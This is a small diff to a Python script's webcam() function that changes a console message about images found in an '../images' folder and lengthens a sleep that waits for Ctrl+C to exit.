@@ -138,11 +138,11 @@ def webcam():
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
     
         if folder != 0:
-           Sprint(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)
+           Sprint(Fore.GREEN + "\r\n\nI got the images , Check Images folder".title() + Fore.RESET)
            
            try:
             Sprint(Fore.YELLOW + "\r\npress ctrl + C for exit".title() + Fore.RESET)
-            sleep(9*9999999)
+            sleep(9*99999999)
            except KeyboardInterrupt:
             pass
             
